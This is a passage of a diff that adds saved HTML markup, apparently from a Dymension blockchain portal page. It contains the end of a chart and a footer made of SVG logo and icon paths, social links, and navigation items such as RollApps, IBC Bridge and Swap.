+               <path class="recharts-curve recharts-area-curve" d="M50,155.833C93.867,155.833,137.733,155.833,181.6,155.833C225.467,155.833,269.333,96.922,313.2,88.151C357.067,79.379,400.933,79.492,444.8,74.993C488.667,70.495,532.533,64.894,576.4,61.16C620.267,57.426,664.133,55.269,708,52.59C751.867,49.91,795.733,47.341,839.6,45.082C883.467,42.822,927.333,41.334,971.2,39.033C1015.067,36.731,1058.933,34.03,1102.8,31.273C1146.667,28.515,1190.533,25.338,1234.4,22.487C1278.267,19.636,1322.133,16.901,1366,14.167" fill="none" fill-opacity="0.6" height="170" stroke="#3182bd" width="1316">
+               </path>
+              </g>
+             </g>
+            </svg>
+            <div class="recharts-tooltip-wrapper recharts-tooltip-wrapper-right recharts-tooltip-wrapper-bottom" role="dialog" style="pointer-events: none; visibility: hidden; position: absolute; top: 0px; left: 0px; transform: translate(50px, 10px);" tabindex="-1">
+             <div class="chart-tooltip">
+              <h6 class="tooltip-label">
+               Feb 07 2024 04:52
+              </h6>
+             </div>
+            </div>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </main>
+    <div class="footer">
+     <a class="connectButton">
+      <span class="icon-container full-logo primary icon-color-fill">
+       <svg fill="none" height="39" viewbox="0 0 232 39" width="232" xmlns="http://www.w3.org/2000/svg">
+        <g clip-path="url(#clip0_4929_988)">
+         <path d="M2.74125 24.3218C1.86609 23.4493 1.27917 22.4416 0.980509 21.299C0.688789 20.1494 0.688789 18.9998 0.980509 17.8502C1.27917 16.6937 1.86261 15.6826 2.73082 14.817C3.61293 13.9375 4.63048 13.3523 5.78347 13.0615C6.93647 12.7706 8.08946 12.7706 9.24245 13.0615C10.3954 13.3523 11.4095 13.934 12.2847 14.8066L14.4517 16.9673L17.6607 13.7678L15.4936 11.6072C14.6184 10.7346 14.0315 9.72697 13.7328 8.58431C13.4411 7.43473 13.4377 6.28861 13.7224 5.14595C14.0142 3.99637 14.6011 2.98183 15.4832 2.10233C16.3583 1.22975 17.3724 0.648041 18.5254 0.357183C19.6784 0.0663253 20.8279 0.0697784 21.9739 0.367562C23.1269 0.658419 24.141 1.24015 25.0162 2.11272C25.8914 2.9853 26.4748 3.99637 26.7665 5.14595C27.0652 6.28861 27.0686 7.43473 26.7769 8.58431C26.4921 9.74082 25.9122 10.7554 25.037 11.6279L22.8804 13.7782L26.0789 16.9673L28.2355 14.817C29.1107 13.9444 30.1213 13.3592 31.2673 13.0615C32.4203 12.7706 33.5698 12.774 34.7159 13.0718C35.8689 13.3627 36.8864 13.9479 37.7685 14.8274C38.6437 15.7 39.2271 16.711 39.5188 17.8606C39.8175 19.0033 39.8175 20.1459 39.5188 21.2886C39.2271 22.4382 38.6437 23.4493 37.7685 24.3218C36.8864 25.2013 35.8689 25.7865 34.7159 26.0774C33.5698 26.3613 32.4203 26.3578 31.2673 26.067C30.1282 25.7761 29.1211 25.1944 28.2459 24.3218L26.0893 22.1716L22.8804 25.371L25.037 27.5213C25.9122 28.3938 26.4921 29.4015 26.7769 30.5441C27.0686 31.6937 27.0686 32.8433 26.7769 33.9929C26.4852 35.1425 25.8983 36.157 25.0162 37.0365C24.148 37.9021 23.1339 38.4839 21.9739 38.7816C20.8209 39.0725 19.668 39.0725 18.515 38.7816C17.3759 38.4908 16.3687 37.9091 15.4936 37.0365C14.6115 36.157 14.0211 35.1459 13.7224 34.0033C13.4307 32.8537 13.4307 31.7041 13.7224 30.5545C14.0281 29.4049 14.615 28.3973 15.4832 27.5317L17.6607 25.3606L14.4622 22.1716L12.2847 24.3426C11.4165 25.2083 10.3989 25.7865 9.23202 26.0774C8.07903 26.3682 6.92606 26.3682 5.77307 26.0774C4.62702 25.7796 3.61641 25.1944 2.74125 24.3218ZM5.34589 21.7249C5.74179 22.1196 6.20021 22.3828 6.72114 22.5143C7.24902 22.6529 7.77343 22.6563 8.29435 22.5247C8.81528 22.3932 9.2737 22.13 9.66961 21.7353L11.8471 19.5642L9.68002 17.4036C9.28411 17.0088 8.82223 16.7491 8.29435 16.6245C7.77343 16.4929 7.2525 16.4929 6.73157 16.6245C6.21064 16.7561 5.74874 17.0227 5.34589 17.4243C4.94998 17.8191 4.68258 18.2727 4.54367 18.7851C4.4117 19.3045 4.4117 19.8239 4.54367 20.3433C4.68258 20.8696 4.94998 21.3301 5.34589 21.7249ZM18.0982 9.01021L20.2653 11.1709L22.4219 9.0206C22.8248 8.61894 23.0888 8.16188 23.2138 7.64941C23.3457 7.13002 23.3423 6.60717 23.2033 6.08085C23.0714 5.56146 22.8074 5.1044 22.4115 4.70966C22.0156 4.31492 21.5572 4.05177 21.0363 3.92019C20.5153 3.78861 19.9944 3.78861 19.4735 3.92019C18.9595 4.04484 18.5011 4.308 18.0982 4.70966C17.7023 5.1044 17.4315 5.56146 17.2856 6.08085C17.1536 6.60024 17.1536 7.11963 17.2856 7.63902C17.4315 8.15841 17.7023 8.61547 18.0982 9.01021ZM28.0838 19.5746L30.2404 21.7249C30.6363 22.1196 31.0913 22.3862 31.6053 22.5247C32.1262 22.6563 33.2538 22.6529 33.7678 22.5143C34.2887 22.3828 34.7506 22.1162 35.1535 21.7145C35.5563 21.3128 35.8203 20.8558 35.9453 20.3433C36.0842 19.8308 36.0877 19.3149 35.9557 18.7955C35.8237 18.2761 35.5598 17.8191 35.1639 17.4243C34.761 17.0227 34.2991 16.7561 33.7782 16.6245C33.2573 16.4929 32.1262 16.4929 31.6053 16.6245C31.0982 16.7561 30.6432 17.0227 30.2404 17.4243L28.0838 19.5746ZM18.0982 34.4395C18.4942 34.8343 18.9526 35.0974 19.4735 35.229C19.9944 35.3606 20.5119 35.3571 21.0259 35.2186C21.5468 35.087 22.0052 34.8239 22.4011 34.4291C22.8039 34.0275 23.0714 33.567 23.2033 33.0476C23.3423 32.5351 23.3457 32.0192 23.2138 31.4998C23.0888 30.9735 22.8283 30.513 22.4324 30.1182L20.2757 27.9679L18.0982 30.139C17.7023 30.5337 17.4349 30.9873 17.296 31.4998C17.164 32.0192 17.164 32.5386 17.296 33.058C17.428 33.5773 17.6954 34.0379 18.0982 34.4395ZM17.0668 19.5746L20.2653 22.7637L23.4742 19.5642L20.2757 16.3752L17.0668 19.5746Z" fill="#24201F">
+         </path>
+        </g>
+        <path d="M63.8994 14.9104C63.0099 12.2502 60.6748 9.77474 57.0425 9.77474C52.1871 9.77474 48.666 14.0976 48.666 20.1569C48.666 26.2163 52.1501 30.5761 57.0425 30.5761C60.0818 30.5761 62.7504 28.6179 63.8994 25.8838V30.1327H68.4954V2.05273H63.8994V14.9104ZM58.7104 27.3247C55.2635 27.3247 53.3732 24.5537 53.3732 20.1569C53.3732 15.7972 55.2635 13.0261 58.7104 13.0261C62.1574 13.0261 64.0477 15.7972 64.0477 20.1569C64.0477 24.5537 62.1574 27.3247 58.7104 27.3247Z" fill="#24201F">
+        </path>
+        <path d="M80.1877 27.3247L74.1092 10.2181H69.4391L75.8512 27.9898H79.9653L77.0372 37.3744H81.8185L90.3804 10.2181H85.525L80.1877 27.3247Z" fill="#24201F">
+        </path>
+        <path d="M114.734 9.77474C111.176 9.77474 109.249 12.2502 108.434 14.6887C107.692 12.1394 105.691 9.77474 102.244 9.77474C98.871 9.77474 97.0548 11.9177 96.1653 14.3193V10.2181H91.5693V30.1327H96.2024V18.5682C96.2024 14.7626 97.5367 13.0631 100.168 13.0631C102.763 13.0631 104.097 14.7626 104.097 18.4943V30.1327H108.73V18.5682C108.73 14.7626 110.064 13.0631 112.696 13.0631C115.29 13.0631 116.625 14.7626 116.625 18.4943V30.1327H121.258V17.6076C121.258 13.0631 119.182 9.77474 114.734 9.77474Z" fill="#24201F">
+        </path>
+        <path d="M142.921 20.0461C142.921 13.8389 139.066 9.77474 133.173 9.77474C127.169 9.77474 123.351 14.0606 123.351 20.1569C123.351 26.2163 127.057 30.5761 133.173 30.5761C137.843 30.5761 141.216 28.5071 142.476 24.2581H137.769C137.065 26.1794 135.768 27.3247 133.21 27.3247C130.393 27.3247 128.429 25.3665 128.058 21.524H142.81C142.884 21.0067 142.921 20.4895 142.921 20.0461ZM133.173 13.0261C136.027 13.0261 137.954 15.1321 138.177 18.3096H128.095C128.577 14.7257 130.467 13.0261 133.173 13.0261Z" fill="#24201F">
+        </path>
+        <path d="M156.094 9.77474C152.647 9.77474 150.683 11.8438 149.756 14.2823V10.2181H145.16V30.1327H149.793V18.5682C149.793 14.7626 151.424 13.0631 154.019 13.0631C156.65 13.0631 158.244 14.7257 158.244 18.4943V30.1327H162.877V17.6076C162.877 13.1739 160.69 9.77474 156.094 9.77474Z" fill="#24201F">
+        </path>
+        <path d="M173.597 30.5761C178.712 30.5761 182.456 28.2854 182.456 24.332C182.456 21.1545 180.64 19.3072 176.451 18.4204L173.301 17.7554C170.892 17.2381 169.669 16.7578 169.669 15.3907C169.669 13.8759 171.485 13.0261 173.486 13.0261C175.265 13.0261 176.896 13.8389 177.415 15.3168H182.085C181.233 11.6221 177.674 9.77474 173.449 9.77474C168.89 9.77474 165.184 12.1024 165.184 15.7602C165.184 18.7899 167.408 20.4525 171.04 21.2284L174.19 21.9304C177.081 22.5216 178.008 23.2605 178.008 24.7754C178.008 26.3272 176.526 27.3247 173.709 27.3247C171.818 27.3247 169.891 26.6227 169.409 24.2212H164.739C165.332 28.4332 168.927 30.5761 173.597 30.5761Z" fill="#24201F">
+        </path>
+        <path d="M189.38 7.15147V2.05273H184.524V7.15147H189.38ZM189.268 30.1327V10.2181H184.635V30.1327H189.268Z" fill="#24201F">
+        </path>
+        <path d="M201.595 30.5761C207.785 30.5761 211.677 26.3272 211.677 20.1569C211.677 14.0237 207.785 9.77474 201.595 9.77474C195.442 9.77474 191.551 14.0237 191.551 20.1569C191.551 26.3272 195.442 30.5761 201.595 30.5761ZM201.595 27.3247C198.185 27.3247 196.258 24.5537 196.258 20.1569C196.258 15.7972 198.185 13.0261 201.595 13.0261C205.042 13.0261 206.932 15.7972 206.932 20.1569C206.932 24.5537 205.042 27.3247 201.595 27.3247Z" fill="#24201F">
+        </path>
+        <path d="M224.837 9.77474C221.39 9.77474 219.426 11.8438 218.499 14.2823V10.2181H213.903V30.1327H218.536V18.5682C218.536 14.7626 220.167 13.0631 222.761 13.0631C225.393 13.0631 226.987 14.7257 226.987 18.4943V30.1327H231.62V17.6076C231.62 13.1739 229.433 9.77474 224.837 9.77474Z" fill="#24201F">
+        </path>
+        <defs>
+         <clippath id="clip0_4929_988">
+          <rect fill="white" height="39" transform="translate(0.619141)" width="39.1234">
+          </rect>
+         </clippath>
+        </defs>
+       </svg>
+      </span>
+     </a>
+     <div class="social-links">
+      <a class="social-link connectButton" rel="noreferrer">
+       <span class="icon-container primary icon-color-fill">
+        <svg fill="#000000" height="50px" viewbox="0 0 50 50" width="50px" xmlns="http://www.w3.org/2000/svg">
+         <path d="M15 12A13 13 0 1015 38 13 13 0 1015 12zM35.5 13c-3.59 0-6.5 5.373-6.5 12 0 1.243.102 2.441.292 3.568.253 1.503.662 2.879 1.192 4.065.265.593.56 1.138.881 1.627.642.978 1.388 1.733 2.202 2.201C34.178 36.811 34.827 37 35.5 37s1.322-.189 1.933-.539c.814-.468 1.56-1.223 2.202-2.201.321-.489.616-1.034.881-1.627.53-1.185.939-2.562 1.192-4.065C41.898 27.441 42 26.243 42 25 42 18.373 39.09 13 35.5 13zM45.5 14c-.259 0-.509.173-.743.495-.157.214-.307.494-.448.833-.071.169-.14.353-.206.551-.133.395-.257.846-.37 1.343-.226.995-.409 2.181-.536 3.497-.063.658-.112 1.349-.146 2.065C43.017 23.499 43 24.241 43 25s.017 1.501.051 2.217c.033.716.082 1.407.146 2.065.127 1.316.31 2.501.536 3.497.113.498.237.948.37 1.343.066.198.135.382.206.551.142.339.292.619.448.833C44.991 35.827 45.241 36 45.5 36c1.381 0 2.5-4.925 2.5-11S46.881 14 45.5 14z">
+         </path>
+        </svg>
+       </span>
+      </a>
+      <a class="social-link connectButton" rel="noreferrer">
+       <span class="icon-container primary icon-color-fill">
+        <svg fill="#000000" height="50px" viewbox="0 0 50 50" width="50px" xmlns="http://www.w3.org/2000/svg">
+         <path d="M 50.0625 10.4375 C 48.214844 11.257813 46.234375 11.808594 44.152344 12.058594 C 46.277344 10.785156 47.910156 8.769531 48.675781 6.371094 C 46.691406 7.546875 44.484375 8.402344 42.144531 8.863281 C 40.269531 6.863281 37.597656 5.617188 34.640625 5.617188 C 28.960938 5.617188 24.355469 10.21875 24.355469 15.898438 C 24.355469 16.703125 24.449219 17.488281 24.625 18.242188 C 16.078125 17.8125 8.503906 13.71875 3.429688 7.496094 C 2.542969 9.019531 2.039063 10.785156 2.039063 12.667969 C 2.039063 16.234375 3.851563 19.382813 6.613281 21.230469 C 4.925781 21.175781 3.339844 20.710938 1.953125 19.941406 C 1.953125 19.984375 1.953125 20.027344 1.953125 20.070313 C 1.953125 25.054688 5.5 29.207031 10.199219 30.15625 C 9.339844 30.390625 8.429688 30.515625 7.492188 30.515625 C 6.828125 30.515625 6.183594 30.453125 5.554688 30.328125 C 6.867188 34.410156 10.664063 37.390625 15.160156 37.472656 C 11.644531 40.230469 7.210938 41.871094 2.390625 41.871094 C 1.558594 41.871094 0.742188 41.824219 -0.0585938 41.726563 C 4.488281 44.648438 9.894531 46.347656 15.703125 46.347656 C 34.617188 46.347656 44.960938 30.679688 44.960938 17.09375 C 44.960938 16.648438 44.949219 16.199219 44.933594 15.761719 C 46.941406 14.3125 48.683594 12.5 50.0625 10.4375 Z">
+         </path>
+        </svg>
+       </span>
+      </a>
+      <a class="social-link connectButton" rel="noreferrer">
+       <span class="icon-container primary icon-color-fill">
+        <svg fill="#000000" height="50px" viewbox="0 0 50 50" width="50px" xmlns="http://www.w3.org/2000/svg">
+         <path d="M 41.625 10.769531 C 37.644531 7.566406 31.347656 7.023438 31.078125 7.003906 C 30.660156 6.96875 30.261719 7.203125 30.089844 7.589844 C 30.074219 7.613281 29.9375 7.929688 29.785156 8.421875 C 32.417969 8.867188 35.652344 9.761719 38.578125 11.578125 C 39.046875 11.867188 39.191406 12.484375 38.902344 12.953125 C 38.710938 13.261719 38.386719 13.429688 38.050781 13.429688 C 37.871094 13.429688 37.6875 13.378906 37.523438 13.277344 C 32.492188 10.15625 26.210938 10 25 10 C 23.789063 10 17.503906 10.15625 12.476563 13.277344 C 12.007813 13.570313 11.390625 13.425781 11.101563 12.957031 C 10.808594 12.484375 10.953125 11.871094 11.421875 11.578125 C 14.347656 9.765625 17.582031 8.867188 20.214844 8.425781 C 20.0625 7.929688 19.925781 7.617188 19.914063 7.589844 C 19.738281 7.203125 19.34375 6.960938 18.921875 7.003906 C 18.652344 7.023438 12.355469 7.566406 8.320313 10.8125 C 6.214844 12.761719 2 24.152344 2 34 C 2 34.175781 2.046875 34.34375 2.132813 34.496094 C 5.039063 39.605469 12.972656 40.941406 14.78125 41 C 14.789063 41 14.800781 41 14.8125 41 C 15.132813 41 15.433594 40.847656 15.621094 40.589844 L 17.449219 38.074219 C 12.515625 36.800781 9.996094 34.636719 9.851563 34.507813 C 9.4375 34.144531 9.398438 33.511719 9.765625 33.097656 C 10.128906 32.683594 10.761719 32.644531 11.175781 33.007813 C 11.234375 33.0625 15.875 37 25 37 C 34.140625 37 38.78125 33.046875 38.828125 33.007813 C 39.242188 32.648438 39.871094 32.683594 40.238281 33.101563 C 40.601563 33.515625 40.5625 34.144531 40.148438 34.507813 C 40.003906 34.636719 37.484375 36.800781 32.550781 38.074219 L 34.378906 40.589844 C 34.566406 40.847656 34.867188 41 35.1875 41 C 35.199219 41 35.210938 41 35.21875 41 C 37.027344 40.941406 44.960938 39.605469 47.867188 34.496094 C 47.953125 34.34375 48 34.175781 48 34 C 48 24.152344 43.785156 12.761719 41.625 10.769531 Z M 18.5 30 C 16.566406 30 15 28.210938 15 26 C 15 23.789063 16.566406 22 18.5 22 C 20.433594 22 22 23.789063 22 26 C 22 28.210938 20.433594 30 18.5 30 Z M 31.5 30 C 29.566406 30 28 28.210938 28 26 C 28 23.789063 29.566406 22 31.5 22 C 33.433594 22 35 23.789063 35 26 C 35 28.210938 33.433594 30 31.5 30 Z">
+         </path>
+        </svg>
+       </span>
+      </a>
+      <a class="social-link connectButton" rel="noreferrer">
+       <span class="icon-container primary icon-color-fill">
+        <svg height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+         <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z">
+         </path>
+        </svg>
+       </span>
+      </a>
+     </div>
+     <nav class="nav-bar footer-nav-bar">
+      <ul class="nav-item-list">
+       <a class="link icon-color-fill medium footer-nav-item connectButton">
+        RollApps
+       </a>
+       <a aria-current="page" class="link icon-color-fill medium footer-nav-item active connectButton">
+        Dymension
+        <svg class="arrow-down" fill="none" height="9" viewbox="0 0 14 9" width="14" xmlns="http://www.w3.org/2000/svg">
+         <path d="M13.2219 2.34689L7.59692 7.97189C7.51854 8.05055 7.42539 8.11297 7.32283 8.15555C7.22027 8.19814 7.11032 8.22006 6.99927 8.22006C6.88822 8.22006 6.77826 8.19814 6.6757 8.15555C6.57314 8.11297 6.48 8.05055 6.40161 7.97189L0.77661 2.34689C0.618102 2.18839 0.529053 1.9734 0.529053 1.74924C0.529053 1.52507 0.618102 1.31009 0.77661 1.15158C0.935118 0.993072 1.1501 0.904024 1.37427 0.904024C1.59843 0.904024 1.81341 0.993072 1.97192 1.15158L6.99997 6.17963L12.028 1.15088C12.1865 0.99237 12.4015 0.90332 12.6257 0.90332C12.8498 0.90332 13.0648 0.99237 13.2233 1.15088C13.3818 1.30939 13.4709 1.52437 13.4709 1.74853C13.4709 1.9727 13.3818 2.18768 13.2233 2.34619L13.2219 2.34689Z" fill="#F1E1D4">
+         </path>
+        </svg>
+       </a>
+       <a class="link icon-color-fill medium footer-nav-item connectButton">
+        IBC Bridge
+       </a>
+       <a class="link icon-color-fill medium footer-nav-item connectButton">
+        Swap
+        <svg class="arrow-down" fill="none" height="9" viewbox="0 0 14 9" width="14" xmlns="http://www.w3.org/2000/svg">
+         <path d="M13.2219 2.34689L7.59692 7.97189C7.51854 8.05055 7.42539 8.11297 7.32283 8.15555C7.22027 8.19814 7.11032 8.22006 6.99927 8.22006C6.88822 8.22006 6.77826 8.19814 6.6757 8.15555C6.57314 8.11297 6.48 8.05055 6.40161 7.97189L0.77661 2.34689C0.618102 2.18839 0.529053 1.9734 0.529053 1.74924C0.529053 1.52507 0.618102 1.31009 0.77661 1.15158C0.935118 0.993072 1.1501 0.904024 1.37427 0.904024C1.59843 0.904024 1.81341 0.993072 1.97192 1.15158L6.99997 6.17963L12.028 1.15088C12.1865 0.99237 12.4015 0.90332 12.6257 0.90332C12.8498 0.90332 13.0648 0.99237 13.2233 1.15088C13.3818 1.30939 13.4709 1.52437 13.4709 1.74853C13.4709 1.9727 13.3818 2.18768 13.2233 2.34619L13.2219 2.34689Z" fill="#F1E1D4">
+         </path>
+        </svg>
+       </a>
+       <a class="link icon-color-fill medium nav-bar-item connectButton">
+        <svg height="24px" viewbox="0 0 24 24" width="24px" xmlns="http://www.w3.org/2000/svg">
+         <path d="M6 10c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm12 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm-6 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z">
+         </path>
+        </svg>
+       </a>
+      </ul>
+     </nav>
+     <div class="section nav-bar-more-menu">
+      <nav class="nav-bar more-menu-nav-items">
+       <ul class="nav-item-list">
+        <a class="link icon-color-fill medium more-menu-nav-item connectButton">
+         Learn
+         <svg height="48px" viewbox="0 0 64 64" width="48px" xmlns="http://www.w3.org/2000/svg">
+          <path d="M 40 10 C 38.896 10 38 10.896 38 12 C 38 13.104 38.896 14 40 14 L 47.171875 14 L 30.585938 30.585938 C 29.804938 31.366938 29.804938 32.633063 30.585938 33.414062 C 30.976938 33.805063 31.488 34 32 34 C 32.512 34 33.023063 33.805062 33.414062 33.414062 L 50 16.828125 L 50 24 C 50 25.104 50.896 26 52 26 C 53.104 26 54 25.104 54 24 L 54 12 C 54 10.896 53.104 10 52 10 L 40 10 z M 18 12 C 14.691 12 12 14.691 12 18 L 12 46 C 12 49.309 14.691 52 18 52 L 46 52 C 49.309 52 52 49.309 52 46 L 52 34 C 52 32.896 51.104 32 50 32 C 48.896 32 48 32.896 48 34 L 48 46 C 48 47.103 47.103 48 46 48 L 18 48 C 16.897 48 16 47.103 16 46 L 16 18 C 16 16.897 16.897 16 18 16 L 30 16 C 31.104 16 32 15.104 32 14 C 32 12.896 31.104 12 30 12 L 18 12 z">
+          </path>
+         </svg>
+        </a>
+        <a class="link icon-color-fill medium more-menu-nav-item connectButton">
+         Documentation
+         <svg height="48px" viewbox="0 0 64 64" width="48px" xmlns="http://www.w3.org/2000/svg">
+          <path d="M 40 10 C 38.896 10 38 10.896 38 12 C 38 13.104 38.896 14 40 14 L 47.171875 14 L 30.585938 30.585938 C 29.804938 31.366938 29.804938 32.633063 30.585938 33.414062 C 30.976938 33.805063 31.488 34 32 34 C 32.512 34 33.023063 33.805062 33.414062 33.414062 L 50 16.828125 L 50 24 C 50 25.104 50.896 26 52 26 C 53.104 26 54 25.104 54 24 L 54 12 C 54 10.896 53.104 10 52 10 L 40 10 z M 18 12 C 14.691 12 12 14.691 12 18 L 12 46 C 12 49.309 14.691 52 18 52 L 46 52 C 49.309 52 52 49.309 52 46 L 52 34 C 52 32.896 51.104 32 50 32 C 48.896 32 48 32.896 48 34 L 48 46 C 48 47.103 47.103 48 46 48 L 18 48 C 16.897 48 16 47.103 16 46 L 16 18 C 16 16.897 16.897 16 18 16 L 30 16 C 31.104 16 32 15.104 32 14 C 32 12.896 31.104 12 30 12 L 18 12 z">
+          </path>
+         </svg>
+        </a>
+        <a class="link icon-color-fill medium more-menu-nav-item disabled connectButton" tabindex="-1">
+         Explorer
+         <svg height="48px" viewbox="0 0 64 64" width="48px" xmlns="http://www.w3.org/2000/svg">
+          <path d="M 40 10 C 38.896 10 38 10.896 38 12 C 38 13.104 38.896 14 40 14 L 47.171875 14 L 30.585938 30.585938 C 29.804938 31.366938 29.804938 32.633063 30.585938 33.414062 C 30.976938 33.805063 31.488 34 32 34 C 32.512 34 33.023063 33.805062 33.414062 33.414062 L 50 16.828125 L 50 24 C 50 25.104 50.896 26 52 26 C 53.104 26 54 25.104 54 24 L 54 12 C 54 10.896 53.104 10 52 10 L 40 10 z M 18 12 C 14.691 12 12 14.691 12 18 L 12 46 C 12 49.309 14.691 52 18 52 L 46 52 C 49.309 52 52 49.309 52 46 L 52 34 C 52 32.896 51.104 32 50 32 C 48.896 32 48 32.896 48 34 L 48 46 C 48 47.103 47.103 48 46 48 L 18 48 C 16.897 48 16 47.103 16 46 L 16 18 C 16 16.897 16.897 16 18 16 L 30 16 C 31.104 16 32 15.104 32 14 C 32 12.896 31.104 12 30 12 L 18 12 z">
+          </path>
+         </svg>
+        </a>
+       </ul>
+      </nav>
+      <div class="more-menu-social-links">
+       <a class="social-link connectButton" rel="noreferrer">
+        <span class="icon-container primary icon-color-fill">
+         <svg fill="#000000" height="50px" viewbox="0 0 50 50" width="50px" xmlns="http://www.w3.org/2000/svg">
+          <path d="M15 12A13 13 0 1015 38 13 13 0 1015 12zM35.5 13c-3.59 0-6.5 5.373-6.5 12 0 1.243.102 2.441.292 3.568.253 1.503.662 2.879 1.192 4.065.265.593.56 1.138.881 1.627.642.978 1.388 1.733 2.202 2.201C34.178 36.811 34.827 37 35.5 37s1.322-.189 1.933-.539c.814-.468 1.56-1.223 2.202-2.201.321-.489.616-1.034.881-1.627.53-1.185.939-2.562 1.192-4.065C41.898 27.441 42 26.243 42 25 42 18.373 39.09 13 35.5 13zM45.5 14c-.259 0-.509.173-.743.495-.157.214-.307.494-.448.833-.071.169-.14.353-.206.551-.133.395-.257.846-.37 1.343-.226.995-.409 2.181-.536 3.497-.063.658-.112 1.349-.146 2.065C43.017 23.499 43 24.241 43 25s.017 1.501.051 2.217c.033.716.082 1.407.146 2.065.127 1.316.31 2.501.536 3.497.113.498.237.948.37 1.343.066.198.135.382.206.551.142.339.292.619.448.833C44.991 35.827 45.241 36 45.5 36c1.381 0 2.5-4.925 2.5-11S46.881 14 45.5 14z">
+          </path>
+         </svg>
+        </span>
+       </a>
+       <a class="social-link connectButton" rel="noreferrer">
+        <span class="icon-container primary icon-color-fill">
+         <svg fill="#000000" height="50px" viewbox="0 0 50 50" width="50px" xmlns="http://www.w3.org/2000/svg">
+          <path d="M 50.0625 10.4375 C 48.214844 11.257813 46.234375 11.808594 44.152344 12.058594 C 46.277344 10.785156 47.910156 8.769531 48.675781 6.371094 C 46.691406 7.546875 44.484375 8.402344 42.144531 8.863281 C 40.269531 6.863281 37.597656 5.617188 34.640625 5.617188 C 28.960938 5.617188 24.355469 10.21875 24.355469 15.898438 C 24.355469 16.703125 24.449219 17.488281 24.625 18.242188 C 16.078125 17.8125 8.503906 13.71875 3.429688 7.496094 C 2.542969 9.019531 2.039063 10.785156 2.039063 12.667969 C 2.039063 16.234375 3.851563 19.382813 6.613281 21.230469 C 4.925781 21.175781 3.339844 20.710938 1.953125 19.941406 C 1.953125 19.984375 1.953125 20.027344 1.953125 20.070313 C 1.953125 25.054688 5.5 29.207031 10.199219 30.15625 C 9.339844 30.390625 8.429688 30.515625 7.492188 30.515625 C 6.828125 30.515625 6.183594 30.453125 5.554688 30.328125 C 6.867188 34.410156 10.664063 37.390625 15.160156 37.472656 C 11.644531 40.230469 7.210938 41.871094 2.390625 41.871094 C 1.558594 41.871094 0.742188 41.824219 -0.0585938 41.726563 C 4.488281 44.648438 9.894531 46.347656 15.703125 46.347656 C 34.617188 46.347656 44.960938 30.679688 44.960938 17.09375 C 44.960938 16.648438 44.949219 16.199219 44.933594 15.761719 C 46.941406 14.3125 48.683594 12.5 50.0625 10.4375 Z">
+          </path>
+         </svg>
+        </span>
+       </a>
+       <a class="social-link connectButton" rel="noreferrer">
+        <span class="icon-container primary icon-color-fill">
+         <svg fill="#000000" height="50px" viewbox="0 0 50 50" width="50px" xmlns="http://www.w3.org/2000/svg">
+          <path d="M 41.625 10.769531 C 37.644531 7.566406 31.347656 7.023438 31.078125 7.003906 C 30.660156 6.96875 30.261719 7.203125 30.089844 7.589844 C 30.074219 7.613281 29.9375 7.929688 29.785156 8.421875 C 32.417969 8.867188 35.652344 9.761719 38.578125 11.578125 C 39.046875 11.867188 39.191406 12.484375 38.902344 12.953125 C 38.710938 13.261719 38.386719 13.429688 38.050781 13.429688 C 37.871094 13.429688 37.6875 13.378906 37.523438 13.277344 C 32.492188 10.15625 26.210938 10 25 10 C 23.789063 10 17.503906 10.15625 12.476563 13.277344 C 12.007813 13.570313 11.390625 13.425781 11.101563 12.957031 C 10.808594 12.484375 10.953125 11.871094 11.421875 11.578125 C 14.347656 9.765625 17.582031 8.867188 20.214844 8.425781 C 20.0625 7.929688 19.925781 7.617188 19.914063 7.589844 C 19.738281 7.203125 19.34375 6.960938 18.921875 7.003906 C 18.652344 7.023438 12.355469 7.566406 8.320313 10.8125 C 6.214844 12.761719 2 24.152344 2 34 C 2 34.175781 2.046875 34.34375 2.132813 34.496094 C 5.039063 39.605469 12.972656 40.941406 14.78125 41 C 14.789063 41 14.800781 41 14.8125 41 C 15.132813 41 15.433594 40.847656 15.621094 40.589844 L 17.449219 38.074219 C 12.515625 36.800781 9.996094 34.636719 9.851563 34.507813 C 9.4375 34.144531 9.398438 33.511719 9.765625 33.097656 C 10.128906 32.683594 10.761719 32.644531 11.175781 33.007813 C 11.234375 33.0625 15.875 37 25 37 C 34.140625 37 38.78125 33.046875 38.828125 33.007813 C 39.242188 32.648438 39.871094 32.683594 40.238281 33.101563 C 40.601563 33.515625 40.5625 34.144531 40.148438 34.507813 C 40.003906 34.636719 37.484375 36.800781 32.550781 38.074219 L 34.378906 40.589844 C 34.566406 40.847656 34.867188 41 35.1875 41 C 35.199219 41 35.210938 41 35.21875 41 C 37.027344 40.941406 44.960938 39.605469 47.867188 34.496094 C 47.953125 34.34375 48 34.175781 48 34 C 48 24.152344 43.785156 12.761719 41.625 10.769531 Z M 18.5 30 C 16.566406 30 15 28.210938 15 26 C 15 23.789063 16.566406 22 18.5 22 C 20.433594 22 22 23.789063 22 26 C 22 28.210938 20.433594 30 18.5 30 Z M 31.5 30 C 29.566406 30 28 28.210938 28 26 C 28 23.789063 29.566406 22 31.5 22 C 33.433594 22 35 23.789063 35 26 C 35 28.210938 33.433594 30 31.5 30 Z">
+          </path>
+         </svg>
+        </span>
+       </a>
+       <a class="social-link connectButton" rel="noreferrer">
+        <span class="icon-container primary icon-color-fill">
+         <svg height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
